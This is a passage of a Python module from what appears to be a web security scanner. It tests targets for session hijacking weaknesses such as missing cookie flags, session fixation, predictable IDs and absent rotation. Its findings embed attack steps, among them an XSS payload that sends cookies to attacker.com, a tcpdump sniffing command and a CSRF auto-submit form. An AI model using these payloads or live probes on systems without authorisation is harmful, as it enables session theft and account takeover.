# core/session_hijack.py
from __future__ import annotations

import base64
import collections
import hashlib
import hmac
import logging
import math
import re
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any, Callable, Dict, Generator, List, Optional, Set, Tuple
from urllib.parse import urljoin, urlparse

import requests
from requests import Response, Session
from requests.exceptions import RequestException

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Enums
# ─────────────────────────────────────────────────────────────────────────────

class HijackTechnique(Enum):
    COOKIE_THEFT_XSS          = "cookie_theft_via_xss_surface"
    COOKIE_THEFT_NETWORK       = "cookie_theft_network_plaintext"
    COOKIE_FLAG_MISSING        = "cookie_missing_security_flag"
    COOKIE_SCOPE_WIDE          = "cookie_scope_too_wide"
    SESSION_FIXATION           = "session_fixation"
    SESSION_PREDICTION         = "session_prediction_low_entropy"
    SESSION_NO_ROTATION        = "session_id_no_rotation_post_login"
    SESSION_REPLAY_WINDOW      = "session_replay_window_open"
    SESSION_TIMEOUT_ABSENT     = "session_timeout_absent"
    CSRF_SAMESITE_MISSING      = "csrf_samesite_missing"
    CSRF_TOKEN_ABSENT          = "csrf_token_absent"
    CORS_CREDENTIAL_WILDCARD   = "cors_credential_wildcard"
    TOKEN_IN_URL               = "token_exposed_in_url"
    TOKEN_IN_REFERRER          = "token_leaked_via_referrer"
    CACHE_SENSITIVE_RESPONSE   = "sensitive_response_cacheable"
    SUBDOMAIN_COOKIE_INHERIT   = "cookie_inherited_by_subdomain"
    CLICKJACKING_SESSION_RIDE  = "clickjacking_session_riding"
    HTTP_SESSION_ON_MIXED      = "session_cookie_on_http_mixed_content"
    RESPONSE_SPLIT             = "http_response_splitting_set_cookie"


class FindingSeverity(Enum):
    CRITICAL = 10
    HIGH     = 7
    MEDIUM   = 5
    LOW      = 3
    INFO     = 1


class FindingStatus(Enum):
    CONFIRMED  = auto()
    LIKELY     = auto()
    POSSIBLE   = auto()
    NOT_VULN   = auto()


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class ParsedCookie:
    """Parsed representation of a single Set-Cookie header value."""
    raw:        str
    name:       str
    value:      str
    domain:     Optional[str]  = None
    path:       Optional[str]  = None
    secure:     bool           = False
    http_only:  bool           = False
    same_site:  Optional[str]  = None     # None | "Strict" | "Lax" | "None"
    max_age:    Optional[int]  = None
    expires:    Optional[str]  = None
    partitioned: bool          = False
    is_session:  bool          = False    # heuristic — name looks like session ID

    _SESSION_HINTS = frozenset({
        "session", "sess", "sid", "ssid", "auth", "token", "jwt",
        "user", "uid", "id", "login", "account", "phpsessid",
        "jsessionid", "aspsessionid", "asp.net_sessionid",
        "laravel_session", "rails_session", "_session_id",
        "connect.sid", "rack.session",
    })

    def __post_init__(self) -> None:
        self.is_session = any(
            hint in self.name.lower()
            for hint in self._SESSION_HINTS
        )

    @classmethod
    def parse(cls, raw: str) -> "ParsedCookie":
        parts    = [p.strip() for p in raw.split(";")]
        name_val = parts[0].split("=", 1)
        name     = name_val[0].strip()
        value    = name_val[1].strip() if len(name_val) > 1 else ""

        c = cls(raw=raw, name=name, value=value)
        for part in parts[1:]:
            low = part.lower()
            if low == "secure":
                c.secure = True
            elif low == "httponly":
                c.http_only = True
            elif low == "partitioned":
                c.partitioned = True
            elif low.startswith("samesite="):
                c.same_site = part.split("=", 1)[1].strip().title()
            elif low.startswith("domain="):
                c.domain = part.split("=", 1)[1].strip()
            elif low.startswith("path="):
                c.path = part.split("=", 1)[1].strip()
            elif low.startswith("max-age="):
                try:
                    c.max_age = int(part.split("=", 1)[1].strip())
                except ValueError:
                    pass
            elif low.startswith("expires="):
                c.expires = part.split("=", 1)[1].strip()
        return c

    def to_dict(self) -> Dict[str, Any]:
        return {
            "name":        self.name,
            "value_len":   len(self.value),
            "value_head":  self.value[:12] + "..." if len(self.value) > 12 else self.value,
            "domain":      self.domain,
            "path":        self.path,
            "secure":      self.secure,
            "http_only":   self.http_only,
            "same_site":   self.same_site,
            "max_age":     self.max_age,
            "partitioned": self.partitioned,
            "is_session":  self.is_session,
        }


@dataclass
class HijackFinding:
    finding_id:   str
    technique:    HijackTechnique
    severity:     FindingSeverity
    status:       FindingStatus
    target_url:   str
    evidence:     Dict[str, Any]
    cookie_name:  Optional[str]
    attack_steps: List[str]
    notes:        str
    timestamp:    datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id":   self.finding_id,
            "technique":    self.technique.value,
            "severity":     self.severity.name,
            "status":       self.status.name,
            "target_url":   self.target_url,
            "evidence":     self.evidence,
            "cookie_name":  self.cookie_name,
            "attack_steps": self.attack_steps,
            "notes":        self.notes,
            "timestamp":    self.timestamp.isoformat(),
        }


@dataclass
class HijackResult:
    run_id:            str
    domain:            str
    targets_probed:    int
    findings:          List[Dict[str, Any]]
    cookies_analyzed:  int
    session_cookies:   int
    score:             float
    risk_level:        str
    techniques_tested: List[str]
    recommendations:   List[str]
    started_at:        datetime
    finished_at:       datetime

    def to_dict(self) -> Dict[str, Any]:
        return {
            "run_id":            self.run_id,
            "domain":            self.domain,
            "targets_probed":    self.targets_probed,
            "findings":          self.findings,
            "cookies_analyzed":  self.cookies_analyzed,
            "session_cookies":   self.session_cookies,
            "score":             round(self.score, 2),
            "risk_level":        self.risk_level,
            "techniques_tested": self.techniques_tested,
            "recommendations":   self.recommendations,
            "started_at":        self.started_at.isoformat(),
            "finished_at":       self.finished_at.isoformat(),
            "duration_s":        round(
                (self.finished_at - self.started_at).total_seconds(), 3
            ),
        }


# ─────────────────────────────────────────────────────────────────────────────
# HTTP session pool — same pattern as auth_bypass.py _SessionPool
# ─────────────────────────────────────────────────────────────────────────────

class _SessionPool:
    _USER_AGENTS: List[str] = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    ]

    def __init__(
        self,
        request_delay: float = 0.4,
        timeout:        float = 8.0,
        verify_tls:     bool  = False,
    ):
        self._delay   = request_delay
        self._timeout = timeout
        self._verify  = verify_tls
        self._local   = threading.local()
        self._last    = threading.local()

    def _session(self) -> Session:
        if not hasattr(self._local, "s"):
            import random
            s = requests.Session()
            s.headers["User-Agent"] = random.choice(self._USER_AGENTS)
            s.verify = self._verify
            s.max_redirects = 5
            self._local.s = s
        return self._local.s

    def _throttle(self) -> None:
        last = getattr(self._last, "ts", 0.0)
        gap  = time.time() - last
        if gap < self._delay:
            time.sleep(self._delay - gap)
        self._last.ts = time.time()

    def get(
        self,
        url:     str,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        allow_redirects: bool = True,
    ) -> Optional[Response]:
        self._throttle()
        try:
            return self._session().get(
                url, headers=headers or {}, cookies=cookies or {},
                timeout=self._timeout, allow_redirects=allow_redirects,
                verify=self._verify,
            )
        except RequestException as e:
            logger.debug("GET %s: %s", url, e)
            return None

    def post(
        self,
        url:     str,
        data:    Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
        allow_redirects: bool = True,
    ) -> Optional[Response]:
        self._throttle()
        try:
            return self._session().post(
                url, data=data or {}, headers=headers or {},
                cookies=cookies or {}, timeout=self._timeout,
                allow_redirects=allow_redirects, verify=self._verify,
            )
        except RequestException as e:
            logger.debug("POST %s: %s", url, e)
            return None

    def reset(self) -> None:
        if hasattr(self._local, "s"):
            self._local.s.close()
            del self._local.s


# ─────────────────────────────────────────────────────────────────────────────
# Surface reader — build target list + raw cookie map from scan_results
# ─────────────────────────────────────────────────────────────────────────────

class _SurfaceReader:
    """
    Reads scan_results without issuing new requests.
    Returns:
      targets: List[str] — URLs to probe
      static_cookies: Dict[str, List[ParsedCookie]] — url → cookies from
                       header_analysis raw_headers_sample
    """

    def read(
        self,
        scan_results: Dict[str, Any],
    ) -> Tuple[List[str], Dict[str, List[ParsedCookie]]]:
        targets: List[str]                           = []
        static_cookies: Dict[str, List[ParsedCookie]] = {}

        # 1. header_analysis targets — most reliable source
        ha = scan_results.get("header_analysis", {})
        for url, target_data in ha.get("targets", {}).items():
            if not target_data.get("reachable", True):
                continue
            if url not in targets:
                targets.append(url)

            raw_hdrs = target_data.get("raw_headers_sample", {})
            cookies  = self._extract_cookies_from_headers(raw_hdrs)
            if cookies:
                static_cookies[url] = cookies

        # 2. email_enumeration login pages
        ee = scan_results.get("email_enumeration", {})
        for page in ee.get("login_pages", []):
            url = page.get("url", "")
            if url and url not in targets:
                targets.append(url)

        # 3. active subdomains
        for sub in scan_results.get("subdomains", []):
            if not (sub.get("http_status") or sub.get("https_status")):
                continue
            scheme = "https" if sub.get("https_status") else "http"
            url    = f"{scheme}://{sub['subdomain']}"
            if url not in targets:
                targets.append(url)

        return targets, static_cookies

    @staticmethod
    def _extract_cookies_from_headers(
        raw_hdrs: Dict[str, str],
    ) -> List[ParsedCookie]:
        cookies: List[ParsedCookie] = []
        for key, val in raw_hdrs.items():
            if key.lower() == "set-cookie":
                for line in (val.split("\n") if "\n" in val else [val]):
                    line = line.strip()
                    if line:
                        try:
                            cookies.append(ParsedCookie.parse(line))
                        except Exception:
                            pass
        return cookies


# ─────────────────────────────────────────────────────────────────────────────
# Cookie flag auditor — static analysis of ParsedCookie objects
# ─────────────────────────────────────────────────────────────────────────────

class _CookieFlagAuditor:
    """
    Audits ParsedCookie objects for missing/weak flags and scope issues.
    Pure static — no network calls.
    Reads from both static_cookies (header_analysis) AND header_analysis
    findings of type cookie_missing_* to avoid re-doing what the header
    analyzer already flagged.
    """

    def audit(
        self,
        static_cookies:  Dict[str, List[ParsedCookie]],
        scan_results:    Dict[str, Any],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []

        # already-flagged cookie issues from header_analysis
        already_flagged: Set[Tuple[str, str]] = set()
        for url, td in scan_results.get("header_analysis", {}).get("targets", {}).items():
            for f in td.get("findings", []):
                if f.get("type", "").startswith("cookie_missing"):
                    already_flagged.add((url, f.get("type", "")))

        for url, cookies in static_cookies.items():
            for ck in cookies:
                findings.extend(
                    self._audit_one(ck, url, already_flagged)
                )

        return findings

    def _audit_one(
        self,
        ck:              ParsedCookie,
        url:             str,
        already_flagged: Set[Tuple[str, str]],
    ) -> List[HijackFinding]:
        out: List[HijackFinding] = []
        scheme = urlparse(url).scheme.lower()

        # ── Secure flag ──────────────────────────────────────────────────────
        if not ck.secure:
            key = (url, "cookie_missing_secure_flag")
            sev = FindingSeverity.HIGH if ck.is_session else FindingSeverity.MEDIUM
            out.append(HijackFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = HijackTechnique.COOKIE_THEFT_NETWORK,
                severity     = sev,
                status       = FindingStatus.CONFIRMED,
                target_url   = url,
                evidence     = {"cookie": ck.to_dict(), "scheme": scheme},
                cookie_name  = ck.name,
                attack_steps = [
                    "Position on same network segment as victim (café Wi-Fi / corporate LAN).",
                    "Run passive sniffer: tcpdump -i eth0 -A 'tcp port 80'",
                    f"Capture '{ck.name}' cookie from plaintext HTTP request.",
                    "Replay in browser: document.cookie = '<stolen_value>'",
                ],
                notes = (
                    f"Cookie '{ck.name}' missing Secure flag — transmitted over HTTP. "
                    f"Passive sniff or SSL-strip intercept yields live session."
                ),
            ))

        # ── HttpOnly flag ─────────────────────────────────────────────────────
        if not ck.http_only and ck.is_session:
            out.append(HijackFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = HijackTechnique.COOKIE_THEFT_XSS,
                severity     = FindingSeverity.HIGH,
                status       = FindingStatus.CONFIRMED,
                target_url   = url,
                evidence     = {"cookie": ck.to_dict()},
                cookie_name  = ck.name,
                attack_steps = [
                    "Identify any reflected/stored XSS on the same origin.",
                    f"Inject: <script>fetch('https://attacker.com/?c='+document.cookie)</script>",
                    f"Receive '{ck.name}' in attacker-controlled request log.",
                    "Replay cookie in authenticated session.",
                ],
                notes = (
                    f"Session cookie '{ck.name}' lacks HttpOnly — readable via "
                    f"document.cookie. Any XSS on the origin converts to full session theft."
                ),
            ))

        # ── SameSite flag ─────────────────────────────────────────────────────
        if ck.same_site is None and ck.is_session:
            out.append(HijackFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = HijackTechnique.CSRF_SAMESITE_MISSING,
                severity     = FindingSeverity.MEDIUM,
                status       = FindingStatus.CONFIRMED,
                target_url   = url,
                evidence     = {"cookie": ck.to_dict()},
                cookie_name  = ck.name,
                attack_steps = [
                    "Host attacker page on external domain.",
                    f"Embed: <form action='{url}/action' method='POST'><input name='amount' value='9999'></form>",
                    "Auto-submit via JS on victim visit.",
                    f"Browser sends '{ck.name}' automatically — no SameSite restriction.",
                ],
                notes = (
                    f"'{ck.name}' has no SameSite attribute. Modern browsers default to "
                    f"Lax, but Lax still sends cookies on top-level navigations. "
                    f"Strict or Lax should be explicit."
                ),
            ))

        # ── SameSite=None without Secure ──────────────────────────────────────
        if ck.same_site and ck.same_site.lower() == "none" and not ck.secure:
            out.append(HijackFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = HijackTechnique.COOKIE_FLAG_MISSING,
                severity     = FindingSeverity.HIGH,
                status       = FindingStatus.CONFIRMED,
                target_url   = url,
                evidence     = {
                    "cookie":    ck.to_dict(),
                    "issue":     "SameSite=None requires Secure per RFC 6265bis",
                },
                cookie_name  = ck.name,
                attack_steps = [
                    "SameSite=None without Secure is rejected by Chrome/Firefox.",
                    "In older browsers or non-standard clients: cookie is sent cross-site over HTTP.",
                    "Network intercept yields live session on plain HTTP.",
                ],
                notes = "SameSite=None requires Secure flag per spec — missing Secure makes this invalid in modern browsers but exploitable in legacy clients.",
            ))

        # ── Broad domain scope ────────────────────────────────────────────────
        if ck.domain and ck.domain.startswith("."):
            out.append(HijackFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = HijackTechnique.SUBDOMAIN_COOKIE_INHERIT,
                severity     = FindingSeverity.MEDIUM,
                status       = FindingStatus.LIKELY,
                target_url   = url,
                evidence     = {
                    "cookie":          ck.to_dict(),
                    "domain_scope":    ck.domain,
                    "attack_surface":  f"Any subdomain of {ck.domain} inherits this cookie",
                },
                cookie_name  = ck.name,
                attack_steps = [
                    f"Find or create a subdomain under {ck.domain} with XSS.",
                    "Inject script that reads document.cookie — session cookie is accessible.",
                    "Exfiltrate to attacker-controlled endpoint.",
                ],
                notes = (
                    f"Cookie scoped to '{ck.domain}' — all subdomains can read it. "
                    f"A compromised subdomain or XSS there yields the parent session."
                ),
            ))

        # ── Session cookie with no max-age / expires (indefinite) ────────────
        if ck.is_session and ck.max_age is None and ck.expires is None:
            out.append(HijackFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = HijackTechnique.SESSION_TIMEOUT_ABSENT,
                severity     = FindingSeverity.LOW,
                status       = FindingStatus.CONFIRMED,
                target_url   = url,
                evidence     = {
                    "cookie":   ck.to_dict(),
                    "issue":    "No max-age or expires — session persists until browser closes",
                },
                cookie_name  = ck.name,
                attack_steps = [
                    "Steal session cookie by any vector (network, XSS, referrer).",
                    "Replay indefinitely — no server-side expiry enforced.",
                    "Session valid across browser restarts if stored in persistent storage.",
                ],
                notes = (
                    f"'{ck.name}' has no expiry. Combined with any other theft vector "
                    f"this gives a persistent session."
                ),
            ))

        return out


# ─────────────────────────────────────────────────────────────────────────────
# Live session probes — network-based tests
# ─────────────────────────────────────────────────────────────────────────────

class _SessionFixationProbe:
    """
    Session fixation: inject a known session ID before authentication,
    verify the server accepts and preserves it after the auth redirect.
    Works by:
      1. GET target with attacker-supplied session cookie
      2. Submit login (or just follow redirect) with same cookie
      3. Check if server echoes back the fixed ID in Set-Cookie
    """

    _FIXED_PREFIX = "ARTEX_FIX_"

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(
        self,
        targets: List[str],
        static_cookies: Dict[str, List[ParsedCookie]],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []
        for url in targets:
            cookies = static_cookies.get(url, [])
            session_cks = [c for c in cookies if c.is_session]
            if not session_cks:
                # probe anyway with common names
                session_cks = [
                    ParsedCookie(raw="PHPSESSID=probe", name="PHPSESSID",
                                 value="probe"),
                    ParsedCookie(raw="sessionid=probe", name="sessionid",
                                 value="probe"),
                    ParsedCookie(raw="JSESSIONID=probe", name="JSESSIONID",
                                 value="probe"),
                ]
            for ck in session_cks[:3]:
                result = self._probe_one(url, ck.name)
                if result:
                    findings.append(result)
                    break
        return findings

    def _probe_one(self, url: str, cookie_name: str) -> Optional[HijackFinding]:
        fixed_val = f"{self._FIXED_PREFIX}{uuid.uuid4().hex[:12]}"

        # GET with fixed session ID
        resp = self._http.get(
            url,
            cookies={cookie_name: fixed_val},
            allow_redirects=True,
        )
        if not resp:
            return None
            
        # Check if server reflected our fixed value back
        reflected = resp.cookies.get(cookie_name)
        if reflected and reflected == fixed_val:
            return HijackFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = HijackTechnique.SESSION_FIXATION,
                severity     = FindingSeverity.HIGH,
                status       = FindingStatus.CONFIRMED,
                target_url   = url,
                evidence     = {
                    "cookie_name":   cookie_name,
                    "fixed_value":   fixed_val,
                    "server_echoed": reflected,
                },
                cookie_name  = cookie_name,
                attack_steps = [
                    f"Attacker generates a known session value: {fixed_val[:20]}...",
                    f"Tricks victim into visiting: {url}?{cookie_name}={fixed_val[:20]}... "
                    f"or sets it via subdomain cookie injection.",
                    "Victim authenticates — server keeps the attacker-known session ID.",
                    "Attacker uses the fixed value to hijack authenticated session.",
                ],
                notes = (
                    f"Server accepted and reflected attacker-supplied {cookie_name!r} "
                    f"without regenerating it. Classic session fixation."
                ),
            )

        # Also check: server accepts fixed ID and sets NO new one (implicit fixation)
        if reflected is None and resp.status_code == 200:
            # Server may be silently accepting the fixed ID without issuing new one
            # Verify by checking session-touching endpoint (login page)
            login_resp = self._http.get(url, cookies={cookie_name: fixed_val})
            if login_resp and login_resp.status_code == 200:
                # No new session was issued → server is using the fixed ID
                new_ck = login_resp.cookies.get(cookie_name)
                if new_ck is None:
                    return HijackFinding(
                        finding_id   = str(uuid.uuid4()),
                        technique    = HijackTechnique.SESSION_FIXATION,
                        severity     = FindingSeverity.HIGH,
                        status       = FindingStatus.LIKELY,
                        target_url   = url,
                        evidence     = {
                            "cookie_name":        cookie_name,
                            "fixed_value":        fixed_val,
                            "new_session_issued": False,
                            "status":             resp.status_code,
                        },
                        cookie_name  = cookie_name,
                        attack_steps = [
                            "Server accepted attacker-controlled session ID without regeneration.",
                            "No new session was issued post-request.",
                            "If victim authenticates with this ID, attacker can replay it.",
                        ],
                        notes = (
                            f"Server consumed attacker-supplied '{cookie_name}' and issued "
                            f"no replacement. Likely session fixation."
                        ),
                    )
        return None


class _SessionEntropyProbe:
    """
    Collects N fresh session IDs and measures:
      - Shannon entropy of the concatenated ID string
      - Sequential / incremental pattern detection
      - Length consistency
      - Charset diversity (hex-only, base64, UUID, etc.)

    Low entropy or sequential patterns → prediction attack viable.
    """

    _SAMPLE_COUNT: int   = 8
    _MIN_ENTROPY:  float = 3.8   # bits per character — below this is predictable

    # Pattern matchers
    _SEQUENTIAL_RE = re.compile(
        r'(\d{4,})',   # find 4+ digit runs
    )
    _HEX_ONLY_RE   = re.compile(r'^[0-9a-f]+$', re.I)
    _B64_RE        = re.compile(r'^[A-Za-z0-9+/=]+$')
    _UUID_RE       = re.compile(
        r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', re.I
    )

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(
        self,
        targets:        List[str],
        static_cookies: Dict[str, List[ParsedCookie]],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []
        for url in targets:
            cookies = static_cookies.get(url, [])
            session_cks = [c for c in cookies if c.is_session]
            if not session_cks:
                continue
            for ck in session_cks[:2]:
                result = self._probe_one(url, ck.name)
                if result:
                    findings.append(result)
        return findings

    def _probe_one(self, url: str, cookie_name: str) -> Optional[HijackFinding]:
        ids: List[str] = []
        for _ in range(self._SAMPLE_COUNT):
            self._http.reset()
            resp = self._http.get(url)
            if resp:
                val = resp.cookies.get(cookie_name)
                if val:
                    ids.append(val)
            time.sleep(0.3)

        if len(ids) < 4:
            return None

        entropy   = self._shannon_entropy("".join(ids))
        seq_score = self._sequential_score(ids)
        analysis  = self._classify_ids(ids)

        vulnerable    = False
        vuln_reasons: List[str] = []

        if entropy < self._MIN_ENTROPY:
            vulnerable = True
            vuln_reasons.append(
                f"Entropy {entropy:.2f} bits/char < threshold {self._MIN_ENTROPY}"
            )
        if seq_score > 0.6:
            vulnerable = True
            vuln_reasons.append(
                f"Sequential pattern score {seq_score:.2f} — IDs increment predictably"
            )
        if analysis.get("unique_ratio", 1.0) < 0.5:
            vulnerable = True
            vuln_reasons.append("Low unique ratio — IDs collide or repeat")

        if not vulnerable:
            return None

        return HijackFinding(
            finding_id   = str(uuid.uuid4()),
            technique    = HijackTechnique.SESSION_PREDICTION,
            severity     = FindingSeverity.HIGH,
            status       = FindingStatus.LIKELY,
            target_url   = url,
            evidence     = {
                "cookie_name":    cookie_name,
                "sample_ids":     ids[:5],
                "sample_count":   len(ids),
                "entropy_bits":   round(entropy, 3),
                "seq_score":      round(seq_score, 3),
                "analysis":       analysis,
                "vuln_reasons":   vuln_reasons,
            },
            cookie_name  = cookie_name,
            attack_steps = [
                f"Collect baseline session IDs: {ids[:3]}",
                "Identify pattern (sequential numeric, low-entropy hex, etc.).",
                "Build ID space and iterate: for i in range(known_id-1000, known_id+1000).",
                "Replay each candidate — valid session returns authenticated response.",
            ],
            notes = "; ".join(vuln_reasons),
        )

    # ── analysis helpers ──────────────────────────────────────────────────

    @staticmethod
    def _shannon_entropy(s: str) -> float:
        if not s:
            return 0.0
        c = collections.Counter(s)
        n = len(s)
        return -sum((v / n) * math.log2(v / n) for v in c.values())

    def _sequential_score(self, ids: List[str]) -> float:
        """Score 0-1: how sequential/incremental the numeric runs are."""
        numbers: List[List[int]] = []
        for sid in ids:
            nums = [int(m) for m in self._SEQUENTIAL_RE.findall(sid)]
            if nums:
                numbers.append(nums)

        if len(numbers) < 3:
            return 0.0

        # compare first numeric run across samples
        first_runs = [n[0] for n in numbers if n]
        if len(first_runs) < 3:
            return 0.0

        diffs = [abs(first_runs[i + 1] - first_runs[i]) for i in range(len(first_runs) - 1)]
        if not diffs:
            return 0.0
        avg_diff = sum(diffs) / len(diffs)
        variance = sum((d - avg_diff) ** 2 for d in diffs) / len(diffs)

        # low variance in diffs → highly sequential
        return max(0.0, 1.0 - min(1.0, variance / (avg_diff + 1) / 10))

    def _classify_ids(self, ids: List[str]) -> Dict[str, Any]:
        lengths    = [len(i) for i in ids]
        unique     = len(set(ids))
        avg_len    = sum(lengths) / len(lengths) if lengths else 0
        consistent = max(lengths) == min(lengths) if lengths else False

        charsets: List[str] = []
        for sid in ids[:3]:
            if self._UUID_RE.match(sid):
                charsets.append("uuid")
            elif self._HEX_ONLY_RE.match(sid):
                charsets.append("hex")
            elif self._B64_RE.match(sid):
                charsets.append("base64")
            else:
                charsets.append("mixed")

        return {
            "avg_length":     round(avg_len, 1),
            "consistent_len": consistent,
            "unique_ratio":   round(unique / len(ids), 2),
            "charsets":       list(set(charsets)),
        }


class _SessionRotationProbe:
    """
    Checks whether the server rotates the session ID after a login/auth action.
    No rotation post-login = session ID valid both pre and post auth
    → fixation attack is trivially exploitable.

    Heuristic: compare session ID before and after POSTing to the login endpoint.
    If the value does not change → no rotation.
    """

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(
        self,
        targets:        List[str],
        static_cookies: Dict[str, List[ParsedCookie]],
        scan_results:   Dict[str, Any],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []

        # get login form info from email_enumeration
        login_pages = scan_results.get("email_enumeration", {}).get("login_pages", [])
        for page in login_pages:
            url         = page.get("url", "")
            form_action = page.get("form_action") or url
            user_field  = page.get("username_field", "username")
            pass_field  = page.get("password_field", "password")

            if not url:
                continue

            # get pre-auth session ID
            self._http.reset()
            pre_resp = self._http.get(url)
            if not pre_resp:
                continue

            pre_id: Optional[str] = None
            ck_name: Optional[str] = None
            for ck in pre_resp.cookies:
                if any(hint in ck.name.lower() for hint in (
                    "session", "sess", "sid", "phpsessid", "jsessionid"
                )):
                    pre_id  = ck.value
                    ck_name = ck.name
                    break

            if not pre_id or not ck_name:
                continue

            # attempt login with invalid credentials
            # (we only care about whether the session ID rotates, not auth success)
            post_resp = self._http.post(
                form_action,
                data={user_field: "probe_user", pass_field: "probe_pass_xyzzy"},
                cookies={ck_name: pre_id},
                allow_redirects=True,
            )
            if not post_resp:
                continue

            post_id = post_resp.cookies.get(ck_name)

            if post_id is not None and post_id == pre_id:
                findings.append(HijackFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = HijackTechnique.SESSION_NO_ROTATION,
                    severity     = FindingSeverity.HIGH,
                    status       = FindingStatus.CONFIRMED,
                    target_url   = url,
                    evidence     = {
                        "cookie_name":  ck_name,
                        "pre_auth_id":  pre_id[:16] + "...",
                        "post_auth_id": post_id[:16] + "...",
                        "rotated":      False,
                    },
                    cookie_name  = ck_name,
                    attack_steps = [
                        f"Set victim's session ID to known value: {ck_name}={pre_id[:16]}...",
                        "Victim logs in — ID is NOT rotated.",
                        "Attacker replays the pre-known ID and accesses authenticated session.",
                    ],
                    notes = (
                        f"Session ID '{ck_name}' unchanged before/after auth POST. "
                        f"Session fixation attack is fully exploitable."
                    ),
                ))

            if post_id is None:
                # no new cookie set — existing one may persist
                findings.append(HijackFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = HijackTechnique.SESSION_NO_ROTATION,
                    severity     = FindingSeverity.MEDIUM,
                    status       = FindingStatus.LIKELY,
                    target_url   = url,
                    evidence     = {
                        "cookie_name":      ck_name,
                        "pre_auth_id":      pre_id[:16] + "...",
                        "new_session_sent": False,
                    },
                    cookie_name  = ck_name,
                    attack_steps = [
                        "No new session cookie issued post-login.",
                        "Pre-auth session may remain valid — test replay manually.",
                    ],
                    notes = "No Set-Cookie in login response — session ID rotation absent or conditional.",
                ))

        return findings


class _ReplayWindowProbe:
    """
    Session replay window: collects a session ID, waits, then replays it.
    If the original session remains valid after N seconds without activity
    and the server has no sliding-window invalidation, the cookie can be
    stolen and replayed later.

    Also probes for simultaneous session use — does the server allow
    the same session ID to be used from two IPs at the same time?
    """

    _IDLE_WAIT_S: float = 15.0  # simulate idle gap

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(
        self,
        targets:        List[str],
        static_cookies: Dict[str, List[ParsedCookie]],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []
        for url in targets[:3]:   # cap — this probe is slow
            cookies = static_cookies.get(url, [])
            session_cks = [c for c in cookies if c.is_session]
            if not session_cks:
                continue
            for ck in session_cks[:1]:
                # only probe if we actually have a live value
                if ck.value and len(ck.value) > 4:
                    result = self._probe_one(url, ck)
                    if result:
                        findings.append(result)
        return findings

    def _probe_one(self, url: str, ck: ParsedCookie) -> Optional[HijackFinding]:
        # Verify the cookie is live
        resp1 = self._http.get(url, cookies={ck.name: ck.value})
        if not resp1 or resp1.status_code not in (200, 302, 403):
            return None

        # Wait idle period
        time.sleep(self._IDLE_WAIT_S)

        # Replay from a "different" UA
        self._http.reset()
        resp2 = self._http.get(url, cookies={ck.name: ck.value})
        if not resp2:
            return None

        if resp2.status_code == resp1.status_code:
            return HijackFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = HijackTechnique.SESSION_REPLAY_WINDOW,
                severity     = FindingSeverity.MEDIUM,
                status       = FindingStatus.LIKELY,
                target_url   = url,
                evidence     = {
                    "cookie_name":     ck.name,
                    "idle_wait_s":     self._IDLE_WAIT_S,
                    "initial_status":  resp1.status_code,
                    "replayed_status": resp2.status_code,
                    "note":            "Same response after idle — no sliding-window invalidation detected",
                },
                cookie_name  = ck.name,
                attack_steps = [
                    f"Steal '{ck.name}' by any vector.",
                    f"Wait {self._IDLE_WAIT_S}s+ or indefinitely — session not expired.",
                    "Replay from attacker machine — server accepts old session.",
                ],
                notes = (
                    f"Session cookie '{ck.name}' accepted after {self._IDLE_WAIT_S}s idle "
                    f"from different client. No sliding-window expiry detected."
                ),
            )
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Static analysers — read scan_results, no network calls
# ─────────────────────────────────────────────────────────────────────────────

class _CsrfSurfaceAnalyzer:
    """
    Cross-checks header_analysis findings for CSRF-enabling conditions:
      - SameSite missing on session cookies (already in cookie auditor)
      - CORS misconfiguration with credentials=true
      - Missing CSRF token in form (from email_enumeration login page data)
    Also flags X-Frame-Options absent as a Clickjacking→Session Riding surface.
    """

    def analyze(
        self,
        scan_results: Dict[str, Any],
        static_cookies: Dict[str, List[ParsedCookie]],
    ) -> List[HijackFinding]:
        findings: List[HijackFinding] = []

        for url, td in scan_results.get("header_analysis", {}).get("targets", {}).items():
            if not td.get("reachable", True):
                continue
            for f in td.get("findings", []):
                ftype = f.get("type", "")

                # CORS credential wildcard — from header analyzer
                if ftype == "cors_credentials_wildcard":
                    findings.append(HijackFinding(
                        finding_id   = str(uuid.uuid4()),
                        technique    = HijackTechnique.CORS_CREDENTIAL_WILDCARD,
                        severity     = FindingSeverity.CRITICAL,
                        status       = FindingStatus.CONFIRMED,
                        target_url   = url,
                        evidence     = {
                            "header_finding": f,
                            "exposed_value":  f.get("exposed_value", ""),
